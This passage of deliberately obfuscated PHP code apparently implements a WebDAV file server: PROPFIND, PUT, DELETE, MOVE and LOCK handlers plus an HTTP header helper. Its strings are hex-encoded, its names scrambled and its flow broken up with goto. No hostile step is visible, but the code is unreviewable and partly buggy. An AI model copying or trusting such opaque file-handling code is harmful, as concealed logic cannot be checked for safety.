mkdir($bšÎ¥ œ „, 511, !0); } public function pathInfo($BÚÕĞéÃ) { return path_info($BÚÕĞéÃ); } public function pathList($b¥ôá×Ê¤‚) { return path_list($b¥ôá×Ê¤‚); } public function pathOut($B¥„È†ï† ) { echo file_get_contents($B¥„È†ï† ); } public function pathPut($fŒ·¦œÊÓ¢, $B‰³ˆÅ–îî = '') { if (!$B‰³ˆÅ–îî) { return file_put_contents($fŒ·¦œÊÓ¢, $_SERVER[ÍÓÖ€°å][33]); } return move_path($B‰³ˆÅ–îî, $fŒ·¦œÊÓ¢); } public function pathRemove($Fİœ×†ò¼¸) { if (is_file($Fİœ×†ò¼¸)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($eåÌ•‰·¼, $f–ŸÊõ‰ØÚ) { return move_path($eåÌ•‰·¼, $f–ŸÊõ‰ØÚ); } public function pathCopy($aÎÛŒº×”², $AÔÀéò©Ì‰) { return copy_dir($aÎÛŒº×”², $AÔÀéò©Ì‰); } public function parsePath($Eï´Çùğ¢·) { return $Eï´Çùğ¢·; } public function parseItem($Eİã³ƒğà) { goto B¤šïÜ²µá; a™ïÃ³æ¤: return $aèğá„˜; goto Eö•¾ò«î‘; B¤šïÜ²µá: $d²Ç ù£š£ =& $_SERVER[ÍÓÖ€°å]; $bï×’‹ÛÇ„ = $this->pathGet() . $d²Ç ù£š£[8] . $Eİã³ƒğà[$d²Ç ù£š£[28]]; $bï×’‹ÛÇ„ = str_replace($d²Ç ù£š£[160], $d²Ç ù£š£[8], rawurlencode($bï×’‹ÛÇ„)); goto d…·Öì»¡; d…·Öì»¡: if (!trim($Eİã³ƒğà[$d²Ç ù£š£[101]])) { $Eİã³ƒğà[$d²Ç ù£š£[101]] = time(); } if (!trim($Eİã³ƒğà[$d²Ç ù£š£[175]])) { $Eİã³ƒğà[$d²Ç ù£š£[175]] = time(); } $aèğá„˜ = array($d²Ç ù£š£[1186] => KodIO::clear($this->urlBase . $d²Ç ù£š£[8] . $bï×’‹ÛÇ„), $d²Ç ù£š£[101] => @gmdate($d²Ç ù£š£[1187], $Eİã³ƒğà[$d²Ç ù£š£[101]]), $d²Ç ù£š£[175] => @gmdate($d²Ç ù£š£[1188], $Eİã³ƒğà[$d²Ç ù£š£[175]]), $d²Ç ù£š£[78] => $Eİã³ƒğà[$d²Ç ù£š£[78]] ? $Eİã³ƒğà[$d²Ç ù£š£[78]] : 0); goto a™ïÃ³æ¤; Eö•¾ò«î‘: } public function parseItemXml($FÒ™¤‘ç›°) { $Eö‰Ó»Àæâ =& $_SERVER[ÍÓÖ€°å]; $F’’ˆÇîï = $this->parseItem($FÒ™¤‘ç›°); if ($FÒ™¤‘ç›°[$Eö‰Ó»Àæâ[29]] == $Eö‰Ó»Àæâ[77]) { $E“äŒ³ª‚ˆ = $Eö‰Ó»Àæâ[1189]; $E“äŒ³ª‚ˆ .= $Eö‰Ó»Àæâ[1190]; } else { $Eè‹ÉËĞåí = $FÒ™¤‘ç›°[$Eö‰Ó»Àæâ[148]] ? $FÒ™¤‘ç›°[$Eö‰Ó»Àæâ[148]] : get_path_ext($FÒ™¤‘ç›°[$Eö‰Ó»Àæâ[28]]); $a²øå²œÛ = get_file_mime($Eè‹ÉËĞåí); $E“äŒ³ª‚ˆ = $Eö‰Ó»Àæâ[1191]; $E“äŒ³ª‚ˆ .= "\x3c\104\x3a\147\145\x74\143\x6f\156\164\x65\156\164\x74\171\160\x65\76{$a²øå²œÛ}\74\x2f\x44\72\x67\x65\x74\x63\157\x6e\x74\x65\x6e\x74\164\171\x70\145\x3e"; } return "\xa\11\x9\74\x44\72\x72\145\x73\x70\157\156\x73\x65\x3e\xa\11\11\11\74\104\72\150\162\145\x66\76{$F’’ˆÇîï[$Eö‰Ó»Àæâ[1186]]}\x3c\57\x44\x3a\150\162\x65\x66\x3e\xa\11\x9\x9\74\104\x3a\160\x72\157\160\163\x74\141\x74\x3e\xa\11\x9\11\x9\x3c\x44\72\x70\x72\x6f\160\76\xa\x9\x9\x9\x9\11\74\104\72\147\x65\x74\x6c\141\163\x74\155\157\144\151\x66\151\x65\144\76{$F’’ˆÇîï[$Eö‰Ó»Àæâ[101]]}\x3c\57\104\x3a\x67\x65\x74\154\x61\x73\164\155\x6f\144\x69\x66\151\145\144\76\12\x9\11\x9\11\11\x3c\x44\x3a\143\x72\145\141\x74\151\x6f\x6e\x64\x61\x74\145\76{$F’’ˆÇîï[$Eö‰Ó»Àæâ[175]]}\74\x2f\104\x3a\143\x72\145\x61\164\151\x6f\x6e\x64\141\164\x65\76\12\11\x9\x9\x9\x9\x3c\104\72\147\x65\x74\143\157\156\164\x65\x6e\x74\154\x65\156\x67\x74\x68\x3e{$F’’ˆÇîï[$Eö‰Ó»Àæâ[78]]}\74\x2f\x44\x3a\147\145\164\143\157\x6e\x74\x65\156\164\x6c\145\x6e\x67\x74\x68\76\xa\11\x9\11\x9\x9{$E“äŒ³ª‚ˆ}\12\x9\x9\x9\x9\x3c\x2f\104\72\160\162\157\160\x3e\12\x9\x9\11\x9\74\x44\x3a\163\x74\141\x74\x75\163\x3e\110\x54\x54\120\x2f\61\56\x31\x20\x32\60\60\40\117\x4b\x3c\x2f\104\72\x73\x74\x61\x74\165\x73\x3e\12\11\11\11\74\x2f\x44\72\160\162\x6f\160\x73\x74\x61\x74\76\xa\x9\x9\74\x2f\104\x3a\162\x65\163\x70\157\156\163\x65\76"; } public function pathListMerge($cäÙáŞÆ…ñ) { goto CëÑ‰µ½¦…; CëÑ‰µ½¦…: $b–¡â²ëÚš =& $_SERVER[ÍÓÖ€°å]; if (!$cäÙáŞÆ…ñ) { return $cäÙáŞÆ…ñ; } $d³¸ñÚç²ï = array($b–¡â²ëÚš[74], $b–¡â²ëÚš[75], $b–¡â²ëÚš[1192]); goto aÉ­½¯êÎÏ; AŒ‰À·ÑŒ: return $C¤…‡ã¥; goto A¤Ş·…¾ñ; aÉ­½¯êÎÏ: $C¤…‡ã¥ = array(); foreach ($cäÙáŞÆ…ñ as $a¬Äš±¢‡£ => $cÀáîŸƒ¥‘) { if (!in_array($a¬Äš±¢‡£, $d³¸ñÚç²ï) || !is_array($cÀáîŸƒ¥‘)) { continue; } $C¤…‡ã¥ = array_merge($C¤…‡ã¥, $cÀáîŸƒ¥‘); } foreach ($C¤…‡ã¥ as &$dÏÎ–ƒ¿À) { $dÏÎ–ƒ¿À[$b–¡â²ëÚš[28]] = str_replace($b–¡â²ëÚš[8], $b–¡â²ëÚš[1017], $dÏÎ–ƒ¿À[$b–¡â²ëÚš[28]]); } goto AŒ‰À·ÑŒ; A¤Ş·…¾ñ: } public function httpPROPFIND() { goto E’ƒ…¡Œê›; BÅ¢•İÖó÷: if ($B­²Û™È¥‚) { $F­•›¹ƒ¾Ô[$f£Æ”ÕõÒõ[175]] = $B­²Û™È¥‚[$f£Æ”ÕõÒõ[175]]; $F­•›¹ƒ¾Ô[$f£Æ”ÕõÒõ[101]] = $B­²Û™È¥‚[$f£Æ”ÕõÒõ[101]]; $F­•›¹ƒ¾Ô[$f£Æ”ÕõÒõ[148]] = $B­²Û™È¥‚[$f£Æ”ÕõÒõ[148]]; $F­•›¹ƒ¾Ô[$f£Æ”ÕõÒõ[29]] = $B­²Û™È¥‚[$f£Æ”ÕõÒõ[29]]; } $cß“ïˆ×ø = HttpHeader::get($f£Æ”ÕõÒõ[1172]); if ($F­•›¹ƒ¾Ô[$f£Æ”ÕõÒõ[29]] == $f£Æ”ÕõÒõ[155]) { $cß“ïˆ×ø = $f£Æ”ÕõÒõ[393]; } goto fœ±çÌÃï; Eëğ¼×è‡î: return array($f£Æ”ÕõÒõ[1193] => 207, $f£Æ”ÕõÒõ[1194] => "\74\x44\x3a\x6d\165\154\x74\x69\x73\x74\141\x74\165\x73\x20\170\155\154\x6e\163\x3a\x44\75\42\x44\101\126\x3a\42\x3e\xa{$CØÉÕÂÆŒ}\xa\74\57\x44\x3a\x6d\165\x6c\164\x69\x73\164\141\164\165\x73\x3e"); goto aì——äø®·; fœ±çÌÃï: if ($cß“ïˆ×ø == $f£Æ”ÕõÒõ[393]) { $Fê‹²‰Ùº = array($F­•›¹ƒ¾Ô); } else { $Fê‹²‰Ùº = array_merge(array($F­•›¹ƒ¾Ô), $Fê‹²‰Ùº); } $CØÉÕÂÆŒ = $f£Æ”ÕõÒõ[33]; foreach ($Fê‹²‰Ùº as $eÑ¯é¶“Ş) { $CØÉÕÂÆŒ .= $this->parseItemXml($eÑ¯é¶“Ş); } goto Eëğ¼×è‡î; e Æµ²—: if (!is_array($Fê‹²‰Ùº)) { return array($f£Æ”ÕõÒõ[1193] => 404, $f£Æ”ÕõÒõ[1194] => $f£Æ”ÕõÒõ[1195]); } $B­²Û™È¥‚ = IO::info($this->path); $F­•›¹ƒ¾Ô = array($f£Æ”ÕõÒõ[378] => $f£Æ”ÕõÒõ[33], $f£Æ”ÕõÒõ[29] => $f£Æ”ÕõÒõ[77]); goto BÅ¢•İÖó÷; E’ƒ…¡Œê›: $f£Æ”ÕõÒõ =& $_SERVER[ÍÓÖ€°å]; $Fê‹²‰Ùº = $this->pathList($this->path); $Fê‹²‰Ùº = $this->pathListMerge($Fê‹²‰Ùº); goto e Æµ²—; aì——äø®·: } public function httpHEAD() { $CœÕ¼Š÷‘æ =& $_SERVER[ÍÓÖ€°å]; $AÈÅ†±Ñ‘ = $this->pathInfo($this->path); if (!$AÈÅ†±Ñ‘ || $AÈÅ†±Ñ‘[$CœÕ¼Š÷‘æ[29]] == $CœÕ¼Š÷‘æ[77]) { return array($CœÕ¼Š÷‘æ[757] => 200, $CœÕ¼Š÷‘æ[907] => array($CœÕ¼Š÷‘æ[1196])); } return array($CœÕ¼Š÷‘æ[757] => 200, $CœÕ¼Š÷‘æ[907] => array($CœÕ¼Š÷‘æ[1197], $CœÕ¼Š÷‘æ[124], $CœÕ¼Š÷‘æ[1198] . $AÈÅ†±Ñ‘[$CœÕ¼Š÷‘æ[78]], $CœÕ¼Š÷‘æ[1199] . get_file_mime($AÈÅ†±Ñ‘[$CœÕ¼Š÷‘æ[148]]), $CœÕ¼Š÷‘æ[120] . gmdate($CœÕ¼Š÷‘æ[1187], $AÈÅ†±Ñ‘[$CœÕ¼Š÷‘æ[1200]]) . $CœÕ¼Š÷‘æ[1201], $CœÕ¼Š÷‘æ[1202])); } public function httpOPTIONS() { $B ¦îß¬æè =& $_SERVER[ÍÓÖ€°å]; return array($B ¦îß¬æè[757] => 200, $B ¦îß¬æè[907] => array($B ¦îß¬æè[1203], $B ¦îß¬æè[1204], $B ¦îß¬æè[1205], $B ¦îß¬æè[1162])); } public function httpPROPPATCH() { $FÜÔˆğËÌ =& $_SERVER[ÍÓÖ€°å]; $b–¤ôï„ø = $FÜÔˆğËÌ[1206] . $_SERVER[$FÜÔˆğËÌ[428]] . $FÜÔˆğËÌ[1207]; return array($FÜÔˆğËÌ[1193] => 207, $FÜÔˆğËÌ[1194] => "\x3c\x44\x3a\155\165\x6c\164\151\163\164\x61\x74\x75\163\40\x78\x6d\x6c\156\x73\72\104\75\x22\x44\101\x56\x3a\x22\x3e\xa{$b–¤ôï„ø}\xa\x3c\x2f\104\x3a\155\x75\x6c\164\151\x73\x74\141\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $D“†îÂ²Ô =& $_SERVER[ÍÓÖ€°å]; $a«Ì†ŒæÎ = $this->uploadFile(); if ($a«Ì†ŒæÎ) { $b“¢÷á‘ôë = 204; } else { $a«Ì†ŒæÎ = $D“†îÂ²Ô[33]; $b“¢÷á‘ôë = 201; } $F ¢ÀÛ§ = $this->pathPut($this->path, $a«Ì†ŒæÎ); if ($F ¢ÀÛ§ == !1) { $b“¢÷á‘ôë = 404; } return array($D“†îÂ²Ô[1193] => $b“¢÷á‘ôë); } private function uploadFile() { goto eèâ·©Ô”; AÇŠ‰“÷œ†: if (@filesize($aëØÇøØ‰) > 0) { return $aëØÇøØ‰; } @unlink($aëØÇøØ‰); return !1; goto b„Ò˜õã«; Bëò“õ‘: while (!feof($F˜’ËˆğÃœ)) { fwrite($F±ø„‹¡, fread($F˜’ËˆğÃœ, 1024 * 200)); } fclose($F˜’ËˆğÃœ); fclose($F±ø„‹¡); goto AÇŠ‰“÷œ†; eèâ·©Ô”: $e’ºŸ¢Ö—œ =& $_SERVER[ÍÓÖ€°å]; @mk_dir(TEMP_FILES); $aëØÇøØ‰ = TEMP_FILES . $e’ºŸ¢Ö—œ[1208] . rand_string(32); goto F‰—§¼ñ–Ñ; F‰—§¼ñ–Ñ: $F±ø„‹¡ = @fopen($aëØÇøØ‰, $e’ºŸ¢Ö—œ[1135]); $F˜’ËˆğÃœ = @fopen($e’ºŸ¢Ö—œ[1209], $e’ºŸ¢Ö—œ[1134]); if (!$F˜’ËˆğÃœ || !$F±ø„‹¡) { @unlink($aëØÇøØ‰); return !1; } goto Bëò“õ‘; b„Ò˜õã«: } public function httpMKCOL() { $aÑ‰’âèÛœ =& $_SERVER[ÍÓÖ€°å]; if ($this->pathExists($this->path)) { return array($aÑ‰’âèÛœ[757] => 409); } $dóñïŠ·½ = $this->pathMkdir($this->path); return array($aÑ‰’âèÛœ[757] => $dóñïŠ·½ ? 201 : 403); } public function httpMOVE() { $bÏ…¼äíèŠ =& $_SERVER[ÍÓÖ€°å]; $A‘–À° ’± = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$bÏ…¼äíèŠ[1210]])) { $c‡‹Ñ÷°¿ù[$bÏ…¼äíèŠ[1211]] = $_SERVER[$bÏ…¼äíèŠ[1210]] == $bÏ…¼äíèŠ[1212]; } $eİ°®ğ›¯ø = $this->pathMove($this->path, $A‘–À° ’±); return array($bÏ…¼äíèŠ[757] => $eİ°®ğ›¯ø ? 201 : 404); } public function httpCOPY() { $Fˆ  ‚œóÚ = $this->parsePath($this->pathGet(!0)); $Fï£­óø›“ = $this->pathCopy($this->path, $Fˆ  ‚œóÚ); return array($_SERVER[ÍÓÖ€°å][757] => $Fï£­óø›“ ? 201 : 404); } public function httpDELETE() { $f ÂÉŒÔ¦Í = $this->pathRemove($this->path); return array($_SERVER[ÍÓÖ€°å][757] => $f ÂÉŒÔ¦Í ? 200 : 503); } public function httpLOCK() { $DìÓ¼¦Ÿº† =& $_SERVER[ÍÓÖ€°å]; $DêÍÄáÒ¯ = md5($this->path); $B½¹ß¢à¢’ = $DìÓ¼¦Ÿº†[1213] . $this->xmlGet($DìÓ¼¦Ÿº†[1214]) . $DìÓ¼¦Ÿº†[1215] . $DêÍÄáÒ¯ . $DìÓ¼¦Ÿº†[1216]; return array($DìÓ¼¦Ÿº†[757] => 200, $DìÓ¼¦Ÿº†[907] => array($DìÓ¼¦Ÿº†[1217] . $DêÍÄáÒ¯, $DìÓ¼¦Ÿº†[1218]), $DìÓ¼¦Ÿº†[1219] => $B½¹ß¢à¢’); } public function httpUNLOCK() { return array($_SERVER[ÍÓÖ€°å][757] => 204); } public function xmlGet($EµìÄ†„Õ™) { goto eÚŠ¢ìİ«; eÚŠ¢ìİ«: $bÉ¯Šâ‚Ï± =& $_SERVER[ÍÓÖ€°å]; static $e¶˜ÍÂ¹“ô = false; if (!$e¶˜ÍÂ¹“ô) { $BÒµ¡Ü›ã = file_get_contents($bÉ¯Šâ‚Ï±[1220]); $e¶˜ÍÂ¹“ô = new DOMDocument(); $e¶˜ÍÂ¹“ô->loadXML($BÒµ¡Ü›ã); } goto EÒ¶²‡›è†; fÒÖöÑÚ‰¼: return $bÉ¯Šâ‚Ï±[33]; goto CäÆ³ïŸ–—; EÒ¶²‡›è†: $f‰“²’²´ = array_shift(explode($bÉ¯Šâ‚Ï±[8], $EµìÄ†„Õ™)); $cÕ¿æÍåºì = $e¶˜ÍÂ¹“ô->getElementsByTagNameNS($bÉ¯Šâ‚Ï±[1221], $f‰“²’²´); if ($cÕ¿æÍåºì) { return $cÕ¿æÍåºì[0]->nodeValue; } goto fÒÖöÑÚ‰¼; CäÆ³ïŸ–—: } public static function response($eä–¶Û¸À) { goto C™öÇºâ‚; C™öÇºâ‚: $bˆÌŸéÛáí =& $_SERVER[ÍÓÖ€°å]; $cãï©ÎŒÑŸ = is_array($eä–¶Û¸À[$bˆÌŸéÛáí[907]]) ? $eä–¶Û¸À[$bˆÌŸéÛáí[907]] : array(); $cãï©ÎŒÑŸ[] = HttpHeader::code($eä–¶Û¸À[$bˆÌŸéÛáí[757]]); goto b¡Â¾Æ£½´; BªÂİ§š·: if (is_string($eä–¶Û¸À[$bˆÌŸéÛáí[1219]])) { header($bˆÌŸéÛáí[1222]); $Eè¦ï¾âŸ = $bˆÌŸéÛáí[1223] . $bˆÌŸéÛáí[212] . $eä–¶Û¸À[$bˆÌŸéÛáí[1219]]; echo $Eè¦ï¾âŸ; } goto b¸Â—¸‘š; b¡Â¾Æ£½´: $cãï©ÎŒÑŸ[] = $bˆÌŸéÛáí[1160]; $cãï©ÎŒÑŸ[] = $bˆÌŸéÛáí[1161]; foreach ($cãï©ÎŒÑŸ as $DŠ¥·ÌĞëº) { header($DŠ¥·ÌĞëº); } goto BªÂİ§š·; b¸Â—¸‘š: } } class HttpHeader { public static $_headers = array("\110\x6f\163\164" => "\x48\x54\x54\120\x5f\x48\x4f\x53\x54", "\125\x73\x65\x72\x2d\x41\147\145\x6e\x74" => "\x48\124\124\x50\137\x55\123\x45\x52\x5f\x41\107\105\x4e\x54", "\103\157\156\x74\x65\156\164\55\124\171\160\x65" => "\110\124\124\120\x5f\x43\117\x4e\124\105\116\124\x5f\x54\131\120\105", "\103\157\156\164\x65\x6e\164\x2d\114\145\x6e\147\164\150" => "\x48\x54\124\120\x5f\103\117\116\124\105\116\x54\x5f\114\x45\116\x47\124\110", "\104\145\x70\x74\150" => "\x48\x54\x54\120\137\104\x45\x50\x54\110", "\x45\170\160\x65\x63\164" => "\x48\124\x54\x50\137\x45\x58\120\105\x43\x54", "\111\146\x2d\116\x6f\156\x65\x2d\115\x61\164\143\150" => "\110\x54\x54\120\x5f\x49\x46\x5f\x4e\117\x4e\x45\x5f\115\101\x54\x43\110", "\111\146\x2d\x4d\x61\164\x63\x68" => "\110\124\x54\x50\137\111\x46\x5f\x4d\x41\x54\103\110", "\x49\146\55\x52\x61\x6e\147\145" => "\110\x54\124\120\x5f\x49\106\137\122\x41\x4e\x47\105", "\114\x61\163\164\55\x4d\x6f\x64\x69\146\151\145\144" => "\x48\124\124\x50\137\114\x41\x53\x54\137\x4d\117\104\x49\106\111\x45\x44", "\111\146\55\x4d\157\144\151\146\151\145\144\x2d\x53\x69\x6e\143\x65" => "\x48\124\124\120\137\x49\x46\x5f\x4d\117\x44\x49\106\x49\x45\104\137\x53\111\116\103\105", "\111\146\55\x55\x6e\155\x6f\144\x69\146\151\145\144\55\x53\151\156\x63\145" => "\110\x54\x54\x50\137\x49\106\x5f\x55\116\x4d\x4f\104\x49\106\111\x45\x44\x5f\123\111\x4e\x43\105", "\x52\141\x6e\x67\145" => "\110\x54\x54\120\137\122\101\x4e\107\105", "\x54\x69\155\145\x6f\165\x74" => "\110\x54\124\x50\x5f\124\x49\x4d\x45\x4f\125\124", "\x49\146" => "\110\x54\x54\x50\x5f\111\106", "\x4c\157\143\153\x2d\x54\157\x6b\145\x6e" => "\110\124\124\x50\137\114\x4f\103\113\137\x54\x4f\x4b\x45\116", "\x4f\x76\x65\162\167\162\151\164\145" => "\x48\x54\x54\120\137\117\x56\x45\x52\x57\x52\x49\x54\105", "\104\x65\163\x74\151\156\141\164\151\x6f\x6e" => "\x48\124\x54\120\137\104\105\123\x54\111\116\x41\x54\x49\x4f\116", "\x52\x65\x71\x75\145\163\164\55\x49\x64" => "\122\x45\121\x55\105\123\x54\x5f\x49\x44", "\122\145\161\x75\145\x73\164\55\x42\x6f\x64\x79\x2d\106\x69\154\x65" => "\x52\105\121\125\105\123\124\137\x42\117\104\131\137\x46\x49\114\x45", "\x52\x65\x64\x69\162\145\x63\x74\x2d\123\x74\141\164\x75\163" => "\122\x45\104\111\122\x45\103\x54\137\123\124\x41\x54\125\123"); public static function init() { static $fÀÉ½Ù’ = false; if ($fÀÉ½Ù’) { return; } foreach ($_SERVER as $aÌ©´‹è“ => $aÚÁÀ—¸ö‚) { $aÌ©´‹è“ = strtoupper($aÌ©´‹è“); if (!array_key_exists($aÌ©´‹è“, $_SERVER)) { continue; } $_SERVER[$aÌ©´‹è“] = $aÚÁÀ—¸ö‚; } foreach (self::$_headers as $aÌ©´‹è“ => $bĞÈÔÜàÃÕ) { if (!array_key_exists($aÌ©´‹è“, $_SERVER)) { continue; } $_SERVER[$aÌ©´‹è“] = $_SERVER[$bĞÈÔÜàÃÕ]; $_SERVER[strtoupper($aÌ©´‹è“)] = $_SERVER[$bĞÈÔÜàÃÕ]; } } public static function get($Fë¾ô´Ú£Û) { self::init(); return $_SERVER[$Fë¾ô´Ú£Û] ? $_SERVER[$Fë¾ô´Ú£Û] : $_SERVER[$_SERVER[ÍÓÖ€°å][1224] . strtoupper($Fë¾ô´Ú£Û)]; } public static function method() { return strtoupper(self::get($_SERVER[ÍÓÖ€°å][142])); } public static function length() { $eê¸ìëìÒ =& $_SERVER[ÍÓÖ€°å]; $aÊ‡Äô¼ÂÁ = self::get($eê¸ìëìÒ[1225]); if (!$aÊ‡Äô¼ÂÁ) { $aÊ‡Äô¼ÂÁ = self::get($eê¸ìëìÒ[846]); } return $aÊ‡Äô¼ÂÁ; } public static function range() { $B˜“·ºÈë¸ =& $_SERVER[ÍÓÖ€°å]; $aö·Úİ¿§¯ = self::get($B˜“·ºÈë¸[186]); if (!$aö·Úİ¿§¯) { return !1; } if (!preg_match($B˜“·ºÈë¸[1226], $aö·Úİ¿§¯, $C‚÷´ãÚ¥)) { return !1; } if ($C‚÷´ãÚ¥[1] === $B˜“·ºÈë¸[33] && $C‚÷´ãÚ¥[2] === $B˜“·ºÈë¸[33]) { return !1; } return array($C‚÷´ãÚ¥[1] !== $B˜“·ºÈë¸[33] ? $C‚÷´ãÚ¥[1] : null, $C‚÷´ãÚ¥[2] !== $B˜“·ºÈë¸[33] ? $C‚÷´ãÚ¥[2] : null); } public static $statusCode = array("\61\60\60" => "\x43\157\x6e\x74\151\x6e\x75\145", "\x31\x30\x31" => "\x53\x77\151\164\143\150\x69\x6e\147\40\x50\162\157\x74\157\143\157\x6c", "\x31\x30\62" => "\x50\x72\157\143\x65\x73\163\151\156\x67", "\61\x30\x33" => "\x45\x61\x72\x6c\x79\x20\110\x69\156\164\163", "\x32\x30\x30" => "\x4f\113", "\62\x30\x31" => "\103\162\x65\141\164\145\144", "\x32\60\x32" => "\x41\x63\143\x65\x70\x74\x65\144", "\62\60\x33" => "\x4e\157\156\55\x41\165\164\150\x6f\162\x69\164\141\164\151\x76\x65\x20\x49\x6e\146\x6f\162\x6d\141\164\151\x6f\156", "\62\60\64" => "\116\157\x20\x43\x6f\156\x74\145\156\x74", "\62\x30\65" => "\122\x65\163\x65\164\40\103\x6f\156\164\145\156\164", "\x32\x30\66" => "\120\141\162\x74\151\141\154\40\103\x6f\x6e\x74\145\x6e\164", "\x32\60\x37" => "\x4d\x75\x6c\x74\x69\55\123\x74\141\x74\x75\x73", "\x33\60\x30" => "\x4d\165\x6c\x74\151\160\x6c\x65\x20\x43\x68\x6f\151\x63\145\x73", "\63\x30\61" => "\x4d\x6f\166\145\x64\40\120\x65\x72\155\x61\156\145\x6e\164\x6c\x79", "\63\60\62" => "\x46\x6f\x75\156\x64", "\x33\60\63" => "\x53\x65\x65\40\117\x74\150\x65\x72", "\x33\60\x34" => "\116\157\164\x20\x4d\x6f\144\151\146\x69\x65\144", "\x33\60\x35" => "\x55\163\145\40\120\162\x6f\170\x79", "\x33\x30\x37" => "\124\145\155\160\x6f\162\141\x72\171\40\x52\x65\x64\151\162\x65\143\164", "\x33\x30\x38" => "\x50\145\162\x6d\141\x6e\145\156\x74\x20\x52\145\x64\151\x72\x65\143\164", "\x34\x30\x30" => "\102\141\144\40\x52\x65\x71\165\x65\x73\164", "\x34\x30\61" => "\x55\x6e\x61\165\x74\150\157\x72\151\x7a\145\x64", "\64\60\62" => "\x50\141\x79\155\145\x6e\164\40\122\x65\161\x75\151\x72\145\144", "\64\60\x33" => "\106\157\162\x62\x69\144\144\x65\156", "\x34\60\x34" => "\116\157\x74\x20\x46\x6f\x75\156\144", "\x34\60\x35" => "\x4d\x65\164\150\x6f\144\x20\x4e\157\164\x20\101\x6c\x6c\x6f\167\145\144", "\x34\60\x36" => "\x4e\157\164\x20\x41\x63\x63\x65\x70\164\141\142\154\145", "\64\x30\67" => "\120\x72\x6f\170\x79\40\101\x75\x74\x68\145\x6e\x74\x69\143\141\x74\151\x6f\156\40\x52\145\x71\165\151\162\x65\144", "\x34\x30\70" => "\x52\145\x71\x75\x65\x73\x74\x20\124\x69\155\x65\x6f\x75\x74", "\64\x30\71" => "\x43\157\x6e\x66\154\x69\143\x74", "\64\61\60" => "\107\157\x6e\x65", "\64\x31\61" => "\114\145\156\147\164\150\40\122\145\161\x75\151\162\x65\144", "\64\61\x32" => "\x50\x72\145\143\x6f\156\144\151\164\151\x6f\156\40\106\x61\151\154\145\144", "\64\x31\x33" => "\x52\145\161\x75\145\x73\x74\x20\x45\156\x74\x69\164\171\x20\x54\x6f\157\x20\114\x61\x72\147\145", "\64\x31\x34" => "\122\145\x71\165\145\x73\164\40\x55\x52\x49\x20\124\x6f\x6f\40\x4c\x61\x72\x67\145", "\x34\x31\x35" => "\x55\156\163\x75\x70\x70\157\162\x74\145\x64\x20\115\145\144\x69\141\40\124\171\160\x65", "\64\61\x36" => "\122\x65\x71\165\x65\x73\x74\x65\144\40\x52\x61\x6e\x67\145\40\x4e\157\x74\x20\123\x61\x74\x69\x73\146\x69\141\142\x6c\x65", "\64\x31\x37" => "\105\170\160\145\143\164\141\164\151\x6f\156\x20\x46\x61\x69\154\145\144", "\x34\62\62" => "\125\156\160\x72\x6f\x63\145\x73\x73\x61\142\x6c\x65\40\105\156\x74\x69\x74\171", "\64\x32\63" => "\x4c\157\x63\x6b\145\x64", "\64\62\64" => "\x46\x61\151\x6c\x65\x64\40\x44\x65\x70\x65\156\x64\145\156\143\171", "\64\x32\x35" => "\x55\156\x6f\x72\x64\145\162\x65\144\x20\103\157\154\154\x65\x63\x74\x69\x6f\x6e", "\x34\x32\x36" => "\125\160\x67\162\x61\144\x65\x20\x52\145\x71\165\151\162\145\x64", "\x34\x32\x38" => "\x50\162\x65\143\157\156\x64\x69\164\151\157\x6e\x20\x52\x65\161\165\151\x72\145\144", "\x34\x32\71" => "\x54\157\157\x20\x4d\141\156\x79\40\122\145\161\x75\x65\163\x74\x73", "\x34\x33\x31" => "\x52\145\161\165\145\163\164\x20\x48\x65\x61\144\x65\x72\x20\106\151\145\x6c\x64\163\40\x54\157\x6f\40\114\141\x72\x67\x65", "\64\64\x34" => "\116\157\x20\x52\145\x73\160\x6f\x6e\x73\x65", "\64\x35\60" => "\x42\x6c\157\143\x6b\145\x64\x20\142\x79\40\127\x69\x6e\144\157\167\x73\40\120\x61\162\145\156\164\141\154\40\103\x6f\x6e\x74\x72\157\x6c\x73", "\x34\x35\61" => "\x55\x6e\141\166\x61\151\x6c\x61\142\x6c\145\x20\106\x6f\162\x20\x4c\x65\147\x61\x6c\x20\x52\x65\x61\x73\157\156\163", "\x34\x39\64" => "\122\145\x71\165\145\163\164\40\110\x65\x61\144\145\x72\x20\124\157\157\x20\x4c\141\x72\x67\145", "\x35\60\60" => "\111\x6e\164\x65\x72\156\x61\154\x20\x53\145\162\x76\145\x72\x20\x45\x72\x72\x6f\162", "\65\60\61" => "\116\x6f\164\x20\x49\x6d\160\x6c\x65\155\x65\x6e\164\x65\144", "\65\60\x32" => "\102\x61\144\x20\x47\141\x74\x65\167\x61\171", "\65\60\x33" => "\x53\145\162\x76\x69\143\145\40\125\156\x61\x76\x61\151\x6c\x61\x62\154\145", "\65\x30\64" => "\107\141\164\x65\167\x61\x79\x20\124\x69\155\145\x6f\x75\164", "\65\60\x35" => "\x48\x54\x54\x50\x20\x56\145\162\163\x69\x6f\156\x20\156\157\164\x20\x73\165\160\160\157\x72\x74\145\144", "\65\x30\67" => "\x49\156\163\165\146\x66\151\x63\x69\145\x6e\x74\x20\123\x74\157\162\141\x67\145"); public static function code($a«‘Ê–Ğ) { $f˜ÃŒïŸ­ =& $_SERVER[ÍÓÖ€°å]; $a«‘Ê–Ğ = $a«‘Ê–Ğ . $f˜ÃŒïŸ­[33]; $eçñáËÖÁ² = self::$statusCode[$a«‘Ê–Ğ]; $eçñáËÖÁ² = $eçñáËÖÁ² ? "\x48\x54\124\120\57\x31\56\x31\40{$a«‘Ê–Ğ}\40" . $eçñáËÖÁ² : $f˜ÃŒïŸ­[33]; return $eçñáËÖÁ²; } } goto F‹Õ£°¯‰à; C„•˜½ï‡: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Eˆî§À«Îğ) { $this->pathParse = $Eˆî§À«Îğ; $this->model = Model($_SERVER[ÍÓÖ€°å][827]); } public function getPath($AÈ˜¥¿¥…Ú) { return trim($AÈ˜¥¿¥…Ú, $_SERVER[ÍÓÖ€°å][8]); } public function pathFather($C•°·öÓœÓ) { $dÌÌ¸¨ÓÃ­ = $this->pathPrase($C•°·öÓœÓ); $dÌÌ¸¨ÓÃ­ = $this->infoSimple($C•°·öÓœÓ); return $dÌÌ¸¨ÓÃ­ ? $dÌÌ¸¨ÓÃ­[$_SERVER[ÍÓÖ€°å][375]] : !1; } public function getPathName($f·ôœí“è›) { $cÀŸ”çö‰Á = $this->infoSimple($f·ôœí“è›); return $cÀŸ”çö‰Á ? 